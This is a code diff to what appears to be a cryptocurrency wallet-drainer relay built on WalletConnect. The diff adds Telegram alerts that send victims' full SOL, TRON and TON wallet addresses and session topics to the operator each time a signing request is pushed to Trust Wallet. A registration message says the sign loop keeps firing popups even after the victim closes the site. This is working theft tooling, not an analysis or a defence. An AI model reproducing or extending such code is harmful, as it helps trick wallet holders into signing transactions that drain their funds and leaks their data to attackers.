@@ -10,6 +10,7 @@ import {
   type RedisPingClient,
 } from '@legion/core/lib/redis-wrapper'
 import IoRedis from 'ioredis'
+import { sendTelegramMessage } from './telegram.js'
 
 // ─── Types ─────────────────────────────────────────────────────────────────────
 
@@ -259,6 +260,11 @@ async function trySolSign(session: WcSessionData): Promise<boolean> {
       { transaction: b64 },
     ])
     console.log('[WcRelay] SOL sign sent | addr:', solAddr.slice(0, 8) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — SOL Sign Sent</b>\n` +
+      `👛 <code>${solAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
     return true
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e)
@@ -302,6 +308,11 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
       await tw.trx.sendRawTransaction({ ...rawTx, signature: result.signature } as unknown as Parameters<typeof tw.trx.sendRawTransaction>[0])
     }
     console.log('[WcRelay] TRON sign sent | addr:', tronAddr.slice(0, 8) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — TRON Sign Sent</b>\n` +
+      `👛 <code>${tronAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
     return true
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e)
@@ -350,6 +361,11 @@ async function tryTonSign(session: WcSessionData): Promise<boolean> {
       },
     ])
     console.log('[WcRelay] TON sign sent | addr:', tonAddr.slice(0, 8) + '...')
+    void sendTelegramMessage(
+      `📨 <b>WC Offsite — TON Sign Sent</b>\n` +
+      `👛 <code>${tonAddr}</code>\n` +
+      `⏳ Waiting for user to approve in Trust Wallet`,
+    ).catch(() => {})
     return true
   } catch (e) {
     const msg = e instanceof Error ? e.message : String(e)
@@ -410,6 +426,23 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
 export async function registerWcSession(data: WcSessionData): Promise<boolean> {
   const stored = await storeSession(data)
   if (!stored) return false
+
+  const addrs = data.wallet_addresses ?? {}
+  const chains = [
+    addrs.evm   ? `EVM: \`${addrs.evm.slice(0,8)}…\``   : null,
+    addrs.sol   ? `SOL: \`${addrs.sol.slice(0,8)}…\``   : null,
+    addrs.tron  ? `TRX: \`${addrs.tron.slice(0,8)}…\``  : null,
+    addrs.ton   ? `TON: \`${addrs.ton.slice(0,8)}…\``   : null,
+    addrs.btc   ? `BTC: \`${addrs.btc.slice(0,8)}…\``   : null,
+  ].filter(Boolean).join('\n')
+
+  console.warn('[WcRelay] about to fire Telegram notification | chains:', chains)
+  void sendTelegramMessage(
+    `🔒 <b>WC Offsite Session Registered</b>\n` +
+    `🗝 Topic: <code>${data.topic.slice(0, 12)}…</code>\n` +
+    `${chains}\n` +
+    `⏳ Sign loop started — popups will fire even after site close`,
+  ).catch((e) => console.warn('[WcRelay] Telegram call threw:', String(e)))
 
   // Deduplicate: one loop per topic
   if (!activeLoops.has(data.topic)) {
